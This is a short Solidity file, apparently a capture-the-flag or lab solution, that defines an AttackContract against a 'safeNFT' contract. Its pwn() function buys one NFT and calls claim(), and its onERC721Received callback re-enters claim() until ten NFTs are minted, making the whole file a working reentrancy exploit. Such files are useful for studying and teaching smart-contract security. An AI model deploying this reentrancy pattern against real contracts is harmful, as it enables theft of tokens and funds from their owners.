// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "./safeNFT.sol";

contract AttackContract {

    safeNFT public nft;
    uint256 counter;
    
    constructor(safeNFT _nft) {
        nft = _nft;
    }

    function pwn() external payable {
        nft.buyNFT{value: 0.01 ether}();
        nft.claim();
    }
    
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        counter++;
        console.log("NFTs minted so far: ", counter);
        // Just mint 10 NFTs, don't be greedy
        if (counter < 10) {
            nft.claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}